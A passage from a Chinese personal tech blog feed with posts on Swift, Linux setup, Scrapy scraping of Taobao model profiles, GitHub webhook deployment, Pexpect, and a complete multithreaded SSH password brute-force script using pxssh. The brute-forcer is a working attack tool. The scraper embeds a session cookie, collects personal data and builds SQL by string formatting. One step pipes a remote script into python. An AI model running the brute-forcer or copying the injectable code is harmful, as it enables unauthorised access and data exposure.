let (justTheStatusCode, _) = http404Error
print(&quot;The status code is \(justTheStatusCode)&quot;) // 输出 &quot;The status code is 404&quot;
</code></pre></li>
<li><p>Swift 的<code>nil</code>和 Objective-C 中的<code>nil</code>并不一样。在 Objective-C 中，<code>nil</code>是一个指向不存在对象的指针。在 Swift 中，<code>nil</code>不是指针——它是一个确定的值，用来表示值缺失。任何类型的可选状态都可以被设置为<code>nil</code>，不只是对象类型。</p>

<pre><code class="language-Swift">var serverResponseCode: Int? = 404
// serverResponseCode 包含一个可选的 Int 值 404
serverResponseCode = nil
// serverResponseCode 现在不包含值
</code></pre></li>
<li><p>使用!来强制解析值之前，一定要确定可选包含一个非nil的值，否则当强制解析一个nil值时会报错。</p>

<pre><code class="language-Swift">var option:Int?    //没有初始值的可选类型变量默认值为nil
var str = &quot;\(option)&quot; //输出:&quot;nil&quot;
str = &quot;\(option!)&quot;    //Error
</code></pre></li>
<li><p>常量的值一旦被确定就不能修改，但是用let声明常量时可以不必紧跟其后为其设置初始值。</p>

<pre><code class="language-Swift">let const_a:String
if (condition){
    const_a = &quot;a&quot;
}else{
    const_a = &quot;b&quot;
}
</code></pre></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[各种程序的安装]]></title>
    <link href="https://blog.mylonly.com/14945010480752.html"/>
    <updated>2017-05-11T19:10:48+08:00</updated>
    <id>https://blog.mylonly.com/14945010480752.html</id>
    <content type="html"><![CDATA[
<ol>
<li>源码安装nginx</li>
</ol>

<pre><code>#安装编译nginx必须的依赖
yum install gcc-c++
yum install pcre pcre-devel  
yum install zlib zlib-devel 
yum install openssl openssl--devel

#下载nginx源码
wget http://nginx.org/download/nginx-1.9.15.tar.gz

#解压
tar -zvxf nginx-1.9.15.tar.gz -C ../document/

#编译安装
cd ../document/nginx-1.9.15
./configure
make
make install
</code></pre>

<ol>
<li>setuptools 安装</li>
</ol>

<pre><code>wget https://bootstrap.pypa.io/ez_setup.py -O - | python

</code></pre>

<ol>
<li>pip源码安装</li>
</ol>

<pre><code>[pip官网安装](https://pypi.python.org/pypi/pip)
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linux常用命令]]></title>
    <link href="https://blog.mylonly.com/14944978089747.html"/>
    <updated>2017-05-11T18:16:48+08:00</updated>
    <id>https://blog.mylonly.com/14944978089747.html</id>
    <content type="html"><![CDATA[
<ol>
<li>磁盘挂载</li>
</ol>

<pre><code>fdisk -l #查看磁盘信息
mount /dev/xvdb1 /mnt #挂载磁盘
</code></pre>

<ol>
<li>设置开机自动加载磁盘</li>
</ol>

<pre><code>vim /etc/fstab
写入 /dev/xvdb1 /mnt ext4 default 1 1
</code></pre>

<ol>
<li>修改主机名</li>
</ol>

<pre><code>vim /etc/sysconfig/network #修改里面的HOSTNAME值
</code></pre>

<ol>
<li>设置ssh自动认证</li>
</ol>

<pre><code>ssh-keygen -t rsa #在客户机生成秘钥，
scp ~/.ssh/id_rsa.pub root@xxx.com:/home/xxx/ #将客户端生成的公钥文件发送到服务器上
#将id_rsa.pub文件写入服务器的.ssh/authorized_keys中，
最好用cat命令写入,手动创建authorized_keys文件会出现各种各样的权限认证问题
cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用树莓派搭建迅雷远程下载服务器]]></title>
    <link href="https://blog.mylonly.com/14945010337427.html"/>
    <updated>2017-05-11T19:10:33+08:00</updated>
    <id>https://blog.mylonly.com/14945010337427.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>树莓派系统为Raspberry Pi</p>
</blockquote>

<ol>
<li><p>树莓派安装迅雷路由器固件<br/>
可以在迅雷论坛上下载到最新的固件:<a href="http://luyou.xunlei.com/">官网论坛</a>,记得要下arm版本的固件<code>armel_v5te_glibc</code><br/>
或者下载我共享的这个<a href="http://pan.baidu.com/s/1nvvoX7b">Xware1.0.31_armel_v5te_glibc</a> 提取码:e223<br/>
在树莓派上解压到某个目录，例如我的是<code>/root/xunlei</code>下面</p>

<pre><code class="language-Shell">unzip Xware1.0.31_armel_v5te_glibc.zip -d /root/xunlei
</code></pre>

<p>进入<code>/root/xunlei</code>目录 执行:</p>

<pre><code class="language-Shell">./portal
</code></pre>

<p>稍等片刻，会在最后输出一个激活码，类似下图中涂红的部分</p>

<p><img src="https://pic.mylonly.com/2016-07-13_15:19:59.jpg" alt="2016-07-13_15:19:59.jpg"/> </p></li>
<li><p>在迅雷远程下载页面绑定树莓派<br/>
登录<a href="http://yuancheng.xunlei.com/">迅雷远程下载主页</a>,登录之后，左侧会有一个添加按钮，点击添加按钮，弹出如下界面:<br/>
<img src="https://pic.mylonly.com/2016-07-13_15:22:45.jpg" alt="2016-07-13_15:22:45.jpg"/></p>

<p>将树莓派上获得的激活码填入框中，点击<code>绑定</code>后左侧就会出现树莓派对应的设备列表了，但是，如果我们此时就在右侧点击<code>新建</code>之后会发现,弹出的新建页面中会提示找不到挂载磁盘，如下图：</p>

<p><img src="http://pic.mylonly.com/2016-07-13_15:25:18.jpg" alt="2016-07-13_15:25:18.jpg"/></p></li>
<li><p>自定义迅雷的下载目录</p>

<p>进入<code>/mnt</code>目录，创建目录TDDOWNLOAD(名字随意)<br/>
执行命令:</p>

<pre><code class="language-Shell">mount --bind /data/TDDOWNLOAD /mnt/TDDOWNLOAD
</code></pre>

<p>其中/data/TDDOWNLOAD就是自定义的下载目录，你可以指定为其他任何目录。</p>

<p>然后再刚刚迅雷固件的解压目录下创建目录<code>etc</code>,同时创建文件<code>thunder_mounts.cfg</code>,编辑此文件</p>

<pre><code class="language-Shell">vim /root/xunlei/etc/thunder_mounts.cfg
</code></pre>

<p>内容为:</p>

<pre><code class="language-Shell">avaliable_mount_path_pattern
{
    /mnt/TDDOWNLOAD
}
</code></pre>

<p>保存后重启迅雷路由器固件:</p>

<pre><code class="language-Shell">./root/xunlei/portal
</code></pre>

<p>再进入远程下载界面新建下载就没有了没挂载磁盘的提示了</p></li>
<li><p>迅雷路由器固件开机启动</p>

<p>在/etc/init.d/下新建xunlei脚本，写入:</p>

<pre><code>```Shell
#!/bin/sh
#
# Xunlei initscript
#
### BEGIN INIT INFO
# Provides:          xunlei
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop::    $network $local_fs $remote_fs
# Should-Start:      $all
# Should-Stop:       $all
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Start xunlei at boot time
# Description:       A downloader
### END INIT INFO

do_start()
{
        ./root/xunlei/portal
}

do_stop()
{
        ./root/xunlei/portal -s
}

case &quot;$1&quot; in
  start)
    do_start
    ;;
  stop)
    do_stop
    ;;
esac
``` 
</code></pre>

<p>然后将该脚本加入默认自启动中</p>

<pre><code class="language-Shell">update-rc.d xunlei defaults
</code></pre></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Scrapy抓取Ajax动态页面]]></title>
    <link href="https://blog.mylonly.com/14945011244738.html"/>
    <updated>2017-05-11T19:12:04+08:00</updated>
    <id>https://blog.mylonly.com/14945011244738.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p>一般来说爬虫类框架抓取Ajax动态页面都是通过一些第三方的webkit库去手动执行html页面中的js代码， 最后将生产的html代码交给spider分析。本篇文章则是通过浏览器提供的Debug工具分析Ajax页面的具体请求内容，找到获取数据的接口url，直接调用该接口获取数据，省去了引入python-webkit库的麻烦，而且由于一般ajax请求的数据都是结构化数据，这样更省去了我们利用xpath解析html的痛苦。</p>
</blockquote>

<p>这次我们要抓取的网站是<a href="https://mm.taobao.com">淘女郎</a>的页面,全站都是通过Ajax获取数据然后重新渲染生产的。</p>

<p>这篇文章的代码已上传至我的<a href="https://github.com/mylonly/Spiders">Github</a>,由于后面有部分内容并没有提供完整代码，所以贴上地址供各位参考。</p>

<h3 id="toc_0">分析工作</h3>

<p>用Chrome打开淘女郎的首页中的<a href="https://mm.taobao.com/search_tstar_model.htm">美人库</a>，这个页面毫无疑问是会展示所有的模特的信息，同时打开Debug工具，在network选项中查看浏览器发送了哪些请求？</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:11:01.jpg" alt="2016-07-04_16:11:01.jpg"/></p>

<p>在截图的左下角可以看到总共产生了86个请求，那么有什么办法可以快速定位到Ajax请求的链接了，利用Network当中提供的Filter功能，选中Filter，最后选择右边的XHR过滤(XHR时XMLHttpRequest对象，一般Ajax请求的数据都是结构化数据)，这样就剩下了为数不多的几个请求，剩下的就靠我们自己一个一个的检查吧</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:22:18.jpg" alt="2016-07-04_16:22:18.jpg"/></p>

<p>很幸运，通过分析每个接口返回的request和response信息，发现最后一个请求就是我们需要的接口url</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:25:56.jpg" alt="2016-07-04_16:25:56.jpg"/></p>

<p>Request中得参数很简单,根据英文意思就可以猜出意义,由于我们要抓取所有模特的信息，所以不需要定制这些参数，后面直接将这些参数post给接口就行了</p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:29:06.jpg" alt="2016-07-04_16:29:06.jpg"/></p>

<p>在Response中可以获得到的有用数据有两个:所有模特信息的列表<code>searchDOList</code>、以及总页数<code>totolPage</code></p>

<p><img src="https://pic.mylonly.com/2016-07-04_16:35:05.jpg" alt="2016-07-04_16:35:05.jpg"/></p>

<p>searchDOList列表中得对象都有如上图所示的json格式，它也正是我们需要的模特信息的数据</p>

<h3 id="toc_1">Scrapy编码</h3>

<ol>
<li><p>定义Item</p>

<pre><code class="language-Python">class tbModelItem(scrapy.Item):
    avatarUrl = scrapy.Field()
    cardUrl = scrapy.Field()
    city = scrapy.Field()
    height = scrapy.Field()
    identityUrl = scrapy.Field()
    modelUrl = scrapy.Field()
    realName = scrapy.Field()
    totalFanNum = scrapy.Field()
    totalFavorNum = scrapy.Field()
    userId = scrapy.Field()
    viewFlag = scrapy.Field()
    weight = scrapy.Field()
</code></pre>

<p>根据上面的分析得到的json格式，我们可以很轻松的定义出item</p></li>
<li><p>Spider编写</p>

<pre><code class="language-Python">import urllib2
import os
import re
import codecs
import json
import sys
from scrapy import Spider
from scrapy.selector import Selector
from MySpider.items import tbModelItem,tbThumbItem
from scrapy.http import Request
from scrapy.http import FormRequest
from scrapy.utils.response import open_in_browser

reload(sys)
sys.setdefaultencoding(&#39;utf8&#39;)

class tbmmSpider(Spider):
    name = &quot;tbmm&quot;
    allow_domians = [&quot;mm.taobao.com&quot;]

    custom_settings = {
        &quot;DEFAULT_REQUEST_HEADERS&quot;:{
            &#39;authority&#39;:&#39;mm.taobao.com&#39;,
            &#39;accept&#39;:&#39;application/json, text/javascript, */*; q=0.01&#39;,
            &#39;accept-encoding&#39;:&#39;gzip, deflate&#39;,
            &#39;accept-language&#39;:&#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,
            &#39;origin&#39;:&#39;https://mm.taobao.com&#39;,
            &#39;referer&#39;:&#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,
            &#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,
            &#39;x-requested-with&#39;:&#39;XMLHttpRequest&#39;,
            &#39;cookie&#39;:&#39;cna=/oN/DGwUYmYCATFN+mKOnP/h; tracknick=adimtxg; _cc_=Vq8l%2BKCLiw%3D%3D; tg=0; thw=cn; v=0; cookie2=1b2b42f305311a91800c25231d60f65b; t=1d8c593caba8306c5833e5c8c2815f29; _tb_token_=7e6377338dee7; CNZZDATA30064598=cnzz_eid%3D1220334357-1464871305-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464871305; CNZZDATA30063600=cnzz_eid%3D1139262023-1464874171-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464874171; JSESSIONID=8D5A3266F7A73C643C652F9F2DE1CED8; uc1=cookie14=UoWxNejwFlzlcw%3D%3D; l=Ahoatr-5ycJM6M9x2/4hzZdp6so-pZzm; mt=ci%3D-1_0&#39;
        },
        &quot;ITEM_PIPELINES&quot;:{
            &#39;MySpider.pipelines.tbModelPipeline&#39;: 300
        }
    } 

    def start_requests(self):
        url = &quot;https://mm.taobao.com/tstar/search/tstar_model.do?_input_charset=utf-8&quot;
        requests = []
        for i in range(1,60):
            formdata = {&quot;q&quot;:&quot;&quot;,
                        &quot;viewFlag&quot;:&quot;A&quot;,
                        &quot;sortType&quot;:&quot;default&quot;,
                        &quot;searchStyle&quot;:&quot;&quot;,
                        &quot;searchRegion&quot;:&quot;city:&quot;,
                        &quot;searchFansNum&quot;:&quot;&quot;,
                        &quot;currentPage&quot;:str(i),
                        &quot;pageSize&quot;:&quot;100&quot;}
            request = FormRequest(url,callback=self.parse_model,formdata=formdata)
            requests.append(request)
        return requests

    def parse_model(self,response):
        jsonBody = json.loads(response.body.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;))
        models = jsonBody[&#39;data&#39;][&#39;searchDOList&#39;]
        modelItems = []
        for dict in models:
            modelItem = tbModelItem()
            modelItem[&#39;avatarUrl&#39;] = dict[&#39;avatarUrl&#39;]
            modelItem[&#39;cardUrl&#39;] = dict[&#39;cardUrl&#39;]
            modelItem[&#39;city&#39;] = dict[&#39;city&#39;]
            modelItem[&#39;height&#39;] = dict[&#39;height&#39;]
            modelItem[&#39;identityUrl&#39;] = dict[&#39;identityUrl&#39;]
            modelItem[&#39;modelUrl&#39;] = dict[&#39;modelUrl&#39;]
            modelItem[&#39;realName&#39;] = dict[&#39;realName&#39;]
            modelItem[&#39;totalFanNum&#39;] = dict[&#39;totalFanNum&#39;]
            modelItem[&#39;totalFavorNum&#39;] = dict[&#39;totalFavorNum&#39;]
            modelItem[&#39;userId&#39;] = dict[&#39;userId&#39;]
            modelItem[&#39;viewFlag&#39;] = dict[&#39;viewFlag&#39;]
            modelItem[&#39;weight&#39;] = dict[&#39;weight&#39;]
            modelItems.append(modelItem)
        return modelItems  
</code></pre>

<p>代码不长，一点一点来分析:</p>

<ol>
<li>由于分析这个页面并不需要递归遍历网页，所以就不要crawlSpider了，只继承最简单的spider</li>
<li>custome_setting可用于自定义每个spider的设置，而setting.py中的都是全局属性的，当你的scrapy工程里有多个spider的时候这个custom_setting就显得很有用了</li>
<li>ITEM_PIPELINES，自定义管道模块，当item获取到数据后会调用你指定的管道处理命令，这个后面会贴上代码，因为这个不影响本文的内容，数据的处理可以因人而异。</li>
<li>依然重写start_request,带上必要的参数请求我们分析得到的借口url，这里我省了一个懒，只遍历了前60页的数据，各位当然可以先调用1次借口确定总的页数(totalPage)之后再写这个for循环。</li>
<li>parse函数里利用json库解析了返回来得数据，赋值给item的相应字段</li>
</ol></li>
<li><p>数据后续处理</p>

<p>数据处理也就是我上面配置ITEM_PIPELINES的目的，这里，我将获取到的item数据存储到了本地的mysql数据中，各位也可以通过FEED_URL参数直接输出json格式文本文件</p>

<pre><code class="language-Python">import MySQLdb

class tbModelPipeline(object):
    def process_item(self,item,spider):
        db = MySQLdb.connect(&quot;localhost&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;spider&quot;)
        cursor = db.cursor()
        db.set_character_set(&#39;utf8&#39;)
        cursor.execute(&#39;SET NAMES utf8;&#39;)
        cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)
        cursor.execute(&#39;SET character_set_connection=utf8;&#39;)

        sql =&quot;INSERT INTO tb_model(user_id,avatar_url,card_url,city,height,identity_url,model_url,real_name,total_fan_num,total_favor_num,view_flag,weight)\
                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;userId&#39;],item[&#39;avatarUrl&#39;],item[&#39;cardUrl&#39;],item[&#39;city&#39;],item[&#39;height&#39;],item[&#39;identityUrl&#39;],\
                      item[&#39;modelUrl&#39;],item[&#39;realName&#39;],item[&#39;totalFanNum&#39;],item[&#39;totalFavorNum&#39;],item[&#39;viewFlag&#39;],item[&#39;weight&#39;])
        try:
                print sql
                cursor.execute(sql)
                db.commit()
        except MySQLdb.Error,e:
                print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])
        db.close()
        return item
</code></pre></li>
</ol>

<h3 id="toc_2">更重要的内容</h3>

<p>获取所有的淘女郎的基本信息并不是<a href="https://mm.taobao.com">淘女郎</a>这个网站的全部内容，还有一些更有意思的数据,比如:</p>

<p>点击进入模特的页面之后发现左侧会有有个相册选项卡，点击后右边出现了各种相册，而每个相册里面都是各种各样的模特照片</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:04:22.jpg" alt="2016-07-04_17:04:22.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:04:49.jpg" alt="2016-07-04_17:04:49.jpg"/></p>

<p>通过network的分析，这些页面的数据通通都是Ajax请求获得的，具体的接口如下:</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:09:51.jpg" alt="2016-07-04_17:09:51.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:10:16.jpg" alt="2016-07-04_17:10:16.jpg"/></p>

<ol>
<li><p>获取相册列表的接口是一个GET请求，其中只有一个很重要的user_id，而这个user_id在上面拿去模特的基本信息已经拿到了，还有个page参数用于标识获取的是第几页数据(由于这个是第一页，并没有在url中显现出来，可以通过返回的html中包含的totalPage元素获得)不过这个接口的返回就不是标准的json格式了，而是一段html，这时候又到了利用scrapy中提供的强大的xpath功能了</p>

<pre><code class="language-Python">def parse_album(self,response):
   sel = Selector(response)
   tbThumbItems = []
   thumb_url_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/@href&quot;).extract()       
   thumb_name_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/text()&quot;).extract()
   user_id = response.meta[&#39;user_id&#39;]
   for i in range(0,len(thumb_url_list)-1):
       thumbItem = tbThumbItem()
       thumbItem[&#39;thumb_name&#39;] = thumb_name_list[i].replace(&#39;\r\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)
       thumbItem[&#39;thumb_url&#39;] = thumb_url_list[i]
       thumbItem[&#39;thumb_userId&#39;] = str(user_id)
       temp = self.urldecode(thumbItem[&#39;thumb_url&#39;])
       thumbItem[&#39;thumb_id&#39;] = temp[&#39;album_id&#39;][0]
       tbThumbItems.append(thumbItem)
   return tbThumbItems
</code></pre></li>
<li><p>获取相册里照片的接口就是一个完全的json格式的接口了,其中参数包括我们已经拿到的user_id以及album_id，page的最大范围totalPage依然可以通过第一次返回的response中的totalPage字段获得</p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:25:23.jpg" alt="2016-07-04_17:25:23.jpg"/></p>

<p><img src="https://pic.mylonly.com/2016-07-04_17:25:46.jpg" alt="2016-07-04_17:25:46.jpg"/></p></li>
</ol>

<h3 id="toc_3">总结</h3>

<ol>
<li>这种通过分析Ajax接口直接调用获取原始数据应该是效率最高的抓取数据方式，但并不是所有的Ajax页面都适用，还是要具体对待，比如我们上面获取相册列表当中就要去分析html来获得相册的基本信息。</li>
<li>获取相册和相册里的照片列表写的比较简略，基本没展示什么代码，这样写是有原因的:一个是因为我已经挂了代码的链接,而且后面这两部分的原理和我主要讲的第一部分获取模特信息的原理基本类似，不想花太多的篇幅花在这种重复的内容上，另外一个我希望想掌握Scrapy的同学能在明白我第一部分的讲解下自己能顺利完成后面的工作，遇到不明白的时候可以看看我Github上的源码，看看有什么不对的地方，只有自己写一遍才能掌握，这是编程界的硬道理。</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用Github的Webhook功能和Node.js完成项目的自动部署]]></title>
    <link href="https://blog.mylonly.com/14945009892942.html"/>
    <updated>2017-05-11T19:09:49+08:00</updated>
    <id>https://blog.mylonly.com/14945009892942.html</id>
    <content type="html"><![CDATA[
<p><u>本文对任何提供Webhook的git仓库都适用</u></p>

<p><img src="https://pic.mylonly.com/2016-06-29_14635623250348.jpg" alt="2016-06-29_14635623250348.jpg"/></p>

<h3 id="toc_0">首先完成Node.js服务器的代码构建，先上代码，再解释</h3>

<pre><code class="language-Node.js">var http = require(&#39;http&#39;)
var createHandler = require(&#39;github-webhook-handler&#39;)
var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; })
// 上面的 secret 保持和 GitHub 后台设置的一致

function run_cmd(cmd, args, callback) {
  var spawn = require(&#39;child_process&#39;).spawn;
  var child = spawn(cmd, args);
  var resp = &quot;&quot;;

  child.stdout.on(&#39;data&#39;, function(buffer) { resp += buffer.toString(); });
  child.stdout.on(&#39;end&#39;, function() { callback (resp) });
}

http.createServer(function (req, res) {
  handler(req, res, function (err) {
    res.statusCode = 404
    res.end(&#39;no such location&#39;)
  })
}).listen(7777)

handler.on(&#39;error&#39;, function (err) {
  console.error(&#39;Error:&#39;, err.message)
})

handler.on(&#39;push&#39;, function (event) {
  console.log(&#39;Received a push event for %s to %s&#39;,
    event.payload.repository.name,
    event.payload.ref);
    run_cmd(&#39;sh&#39;, [&#39;./deploy.sh&#39;,event.payload.repository.name], function(text){ console.log(text) });
})
</code></pre>

<p>上面的代码中用到了一个<code>github-webhook-handler</code>的中间价，你可以用<code>npm install -g github-webhook-handler</code>来全局安装</p>

<p>还有代码这行:<br/>
<code><br/>
var handler = createHandler({ path: &#39;/&#39;, secret: &#39;root&#39; }) <br/>
</code><br/>
其中secret后的参数是你在github的项目中添加webhook时设置的secret值，替换成自己的就行了</p>

<h3 id="toc_1">完成deploy.sh脚本</h3>

<p>deploy.sh脚本负责进入项目的目录，然后利用git命令拉取最新的代码，还是直接贴代码:</p>

<pre><code class="language-Bash"> #!/bin/bash

WEB_PATH=&#39;/root/tools/&#39;$1
WEB_USER=&#39;root&#39;
WEB_USERGROUP=&#39;root&#39;

echo &quot;Start deployment&quot;
cd $WEB_PATH
echo &quot;pulling source code...&quot;
git reset --hard origin/master
git clean -f
git pull
git checkout master
echo &quot;changing permissions...&quot;
chown -R $WEB_USER:$WEB_USERGROUP $WEB_PATH
echo &quot;Finished.&quot;
</code></pre>

<p>deploy.sh 会接受第一个参数当做项目名字，然后进入这个项目的目录执行git操作，这个参数是在deploy.js中根据hook返回的项目名字来的，代码应该比较容易懂，都是些简单的git命令。</p>

<blockquote>
<p>如果是全新的项目，需要在你的服务器上先clone要部署的项目<br/>
你需要根据自己的实际项目位置，修改WEB_PATH的值</p>
</blockquote>

<h3 id="toc_2">后台运行deploy.js</h3>

<p>利用Linux提供的nohup命令，让deploy.js运行在后台</p>

<pre><code>nohup node deploy.js &gt; deploy.log &amp;
</code></pre>

<h3 id="toc_3">去Github后台添加webhook</h3>

<p>进入你需要自动部署的项目的github地址，进入项目的设置页面，点击左侧的<code>Webhooks &amp; services</code><br/>
<img src="https://pic.mylonly.com/2016-06-29_14635620989191.jpg" alt="2016-06-29_14635620989191.jpg"/></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[利用pxssh暴力破解ssh密码]]></title>
    <link href="https://blog.mylonly.com/14945011465578.html"/>
    <updated>2017-05-11T19:12:26+08:00</updated>
    <id>https://blog.mylonly.com/14945011465578.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p><mark>关于pxssh</mark><br/>
pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。</p>
</blockquote>

<h4 id="toc_0">利用pxssh的login函数判断密码是否正确</h4>

<p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>

<pre><code class="language-Python">def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print(&#39;[+]Password Found:&#39;+password)
    except Exception,e:
        print (&#39;[-] Error Connecting:&#39;+str(e))
    finally:
        connection_lock.release()
</code></pre>

<h4 id="toc_1">多线程和信号量</h4>

<p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>

<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
for line in password_file:
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()
</code></pre>

<p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>

<pre><code class="language-Python">maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)
password_file = open(password,&#39;r&#39;)
for line in password_file:
   password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
   connection_lock.acquire()
   print(&#39;[-] Testing password:&#39;+str(password))
   thread = threading.Thread(target=connect,args=(host,user,password))
   thread.start()
</code></pre>

<p>最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。</p>

<h4 id="toc_2">测试结果</h4>

<p><img src="https://pic.mylonly.com/2016-06-29_14667836697742.jpg" alt="2016-06-29_14667836697742.jpg"/><br/>
字典文件可以自己生成，或者网上找一些常用字典文件</p>

<h4 id="toc_3">完整代码</h4>

<pre><code class="language-Python">from pexpect import pxssh
import threading
import optparse
import time

maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)

def send_command(child,cmd):
    child.sendline(cmd)
    child.prompt()
    print(child.before)

def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print(&#39;[+]Password Found:&#39;+password)
    except Exception,e:
        print (&#39;[-] Error Connecting:&#39;+str(e))
    finally:
        connection_lock.release()

def main():
    
    parse = optparse.OptionParser(&#39;Usage %prog &#39;+ \
        &#39;-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&#39;)
    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify target host&#39;)
    parse.add_option(&#39;-u&#39;,dest=&#39;user&#39;,type=&#39;string&#39;,help=&#39;specify username&#39;)
    parse.add_option(&#39;-F&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify password file&#39;)
    (options,args) = parse.parse_args()

    host = options.host
    user = options.user
    password = options.password

    password_file = open(password,&#39;r&#39;)

    for line in password_file:
        password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
        connection_lock.acquire()
        print(&#39;[-] Testing password:&#39;+str(password))
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()

if __name__ == &#39;__main__&#39;:
    main()

</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Python利用Pexpect模拟ssh交互]]></title>
    <link href="https://blog.mylonly.com/14945011027951.html"/>
    <updated>2017-05-11T19:11:42+08:00</updated>
    <id>https://blog.mylonly.com/14945011027951.html</id>
    <content type="html"><![CDATA[
<blockquote>
<p><mark>关于Pexpect</mark><br/>
Pexpect 是 Don Libes 的 Expect 语言的一个 Python 实现，是一个用来启动子程序，并使用正则表达式对程序输出做出特定响应，以此实现与其自动交互的 Python 模块。 Pexpect 的使用范围很广，可以用来实现与 ssh、ftp 、telnet 等程序的自动交互；可以用来自动复制软件安装包并在不同机器自动安装；还可以用来实现软件测试中与命令行交互的自动化。</p>
</blockquote>

<h5 id="toc_0">本文利用到的Pexpect的类和方法</h5>

<ol>
<li><p><code>spawn()</code>类:</p>

<pre><code class="language-Python">class spawn:
    def __init__(self,command,args=[],timeout=30,maxread=2000,\
    searchwindowsize=None, logfile=None, cwd=None, env=None)
</code></pre>

<p>spawn是Pexpect模块主要的类，用以实现启动子程序，它有丰富的方法与子程序交互从而实现用户对子程序的控制。它主要使用 pty.fork() 生成子进程，并调用 exec() 系列函数执行 command 参数的内容。</p></li>
<li><p><code>spawn()</code>类中的<code>expect()</code>函数:</p>

<pre><code class="language-Python">expect(self, pattern, timeout=-1, searchwindowsize=None)
</code></pre>

<p>在参数中： pattern 可以是正则表达式， pexpect.EOF ， pexpect.TIMEOUT ，或者由这些元素组成的列表。需要注意的是，当 pattern 的类型是一个列表时，且子程序输出结果中不止一个被匹配成功，则匹配返回的结果是缓冲区中最先出现的那个元素，或者是列表中最左边的元素。使用 timeout 可以指定等待结果的超时时间 ，该时间以秒为单位。当超过预订时间时， expect 匹配到pexpect.TIMEOUT。</p></li>
<li><p><code>spawn()</code>类中的<code>before</code>和<code>after</code>属性:</p>

<p>expect 不断从读入缓冲区中匹配目标正则表达式，当匹配结束时 pexpect 的 before 成员中保存了缓冲区中匹配成功处之前的内容， pexpect 的 after 成员保存的是缓冲区中与目标正则表达式相匹配的内容。</p>

<pre><code class="language-Python">child = pexpect.spawn(&#39;/bin/ls /&#39;) 
child.expect (pexpect.EOF) 
print child.before
</code></pre>

<p>以上代码就是打印在根目录下面执行ls命令后的输出内容</p></li>
<li><p><code>spawn()</code>类中的send系列函数:</p>

<pre><code class="language-Python">send(self, s) 
sendline(self, s=&#39;&#39;) 
sendcontrol(self, char)
</code></pre>

<p>这些方法用来向子程序发送命令，模拟输入命令的行为。 与 send() 不同的是 sendline() 会额外输入一个回车符 ，更加适合用来模拟对子程序进行输入命令的操作。 当需要模拟发送 “Ctrl+c” 的行为时，还可以使用 sendcontrol() 发送控制字符。</p>

<pre><code class="language-Python">child.sendcontrol(&#39;c&#39;)

</code></pre></li>
</ol>

